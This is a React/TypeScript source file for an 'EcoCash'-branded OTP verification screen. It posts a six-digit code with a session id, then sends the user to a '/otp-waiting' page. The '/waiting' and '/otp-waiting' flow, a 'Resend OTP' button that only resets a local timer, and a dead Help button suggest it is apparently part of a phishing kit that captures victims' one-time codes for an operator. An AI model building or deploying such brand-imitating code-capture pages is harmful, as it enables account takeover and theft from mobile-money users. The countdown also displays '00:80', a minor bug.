import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useSubmitOtp } from "@workspace/api-client-react";
import { getSessionId } from "@/lib/session";
import { Button } from "@/components/ui/button";
import { ArrowLeft, HelpCircle } from "lucide-react";
import { toast } from "sonner";

export default function Otp() {
  const [, setLocation] = useLocation();
  const [otp, setOtp] = useState<string[]>(Array(6).fill(""));
  const [timeLeft, setTimeLeft] = useState(80);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const submitOtp = useSubmitOtp();
  const sessionId = getSessionId();

  useEffect(() => {
    if (timeLeft > 0) {
      const timer = setTimeout(() => setTimeLeft(t => t - 1), 1000);
      return () => clearTimeout(timer);
    }
    return;
  }, [timeLeft]);

  const handleChange = (index: number, value: string) => {
    const val = value.replace(/\D/g, '').slice(0, 1);
    const newOtp = [...otp];
    newOtp[index] = val;
    setOtp(newOtp);

    if (val && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    if (val && index === 5) {
      const fullOtp = newOtp.join('');
      if (fullOtp.length === 6) {
        handleSubmit(fullOtp);
      }
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handleSubmit = (code: string) => {
    if (!sessionId) return;
    
    submitOtp.mutate(
      {
        sessionId,
        data: { otp: code }
      },
      {
        onSuccess: () => {
          setLocation("/otp-waiting");
        },
        onError: () => {
          toast.error("Failed to submit OTP");
        }
      }
    );
  };

  return (
    <div className="min-h-[100dvh] w-full max-w-md mx-auto bg-slate-900 flex flex-col text-white relative overflow-hidden">
      {/* Background decoration */}
      <div className="absolute top-0 right-0 w-64 h-64 bg-blue-500/10 rounded-full blur-3xl translate-x-1/2 -translate-y-1/2"></div>
      
      <div className="p-6 z-10 flex-1">
        <header className="flex items-center mb-10">
          <button onClick={() => setLocation("/waiting")} className="p-2 -ml-2 rounded-full hover:bg-white/10 transition-colors">
            <ArrowLeft className="w-6 h-6" />
          </button>
          <h1 className="text-xl font-medium ml-2">Verification</h1>
        </header>

        <div className="flex flex-col items-center mb-12">
          <div className="text-3xl font-bold tracking-tight mb-6">
            <span className="text-white">Eco</span>
            <span className="text-blue-400">Cash</span>
          </div>
          
          <p className="text-center text-slate-300 px-4">
            Enter the OTP code sent to your phone.
          </p>
        </div>

        <div className="flex justify-between gap-2 px-2 mb-10">
          {otp.map((digit, index) => (
            <input
              key={index}
              ref={el => { inputRefs.current[index] = el; }}
              type="tel"
              value={digit}
              onChange={e => handleChange(index, e.target.value)}
              onKeyDown={e => handleKeyDown(index, e)}
              className="w-12 h-14 bg-white/10 border border-white/20 rounded-xl text-center text-2xl font-bold focus:bg-white focus:text-slate-900 focus:border-transparent outline-none transition-all"
              autoComplete="off"
            />
          ))}
        </div>

        <div className="flex flex-col items-center">
          <div className="text-4xl font-light tabular-nums tracking-widest text-white mb-6">
            00:{timeLeft.toString().padStart(2, '0')}
          </div>
          
          {timeLeft === 0 && (
            <Button variant="outline" className="bg-transparent border-white/20 text-white hover:bg-white/10 rounded-xl" onClick={() => setTimeLeft(80)}>
              Resend OTP
            </Button>
          )}
        </div>
      </div>

      <div className="bg-blue-600 rounded-t-[40px] p-6 pb-8 pt-8 flex flex-col items-center justify-between z-10 shadow-[0_-10px_40px_rgba(37,99,235,0.2)]">
        <Button variant="ghost" className="bg-white/20 hover:bg-white/30 text-white border-0 rounded-full px-6 mb-4">
          <HelpCircle className="w-4 h-4 mr-2" /> Help & Support
        </Button>
        <p className="text-blue-200 text-sm">Version 3.2.1</p>
      </div>
    </div>
  );
}
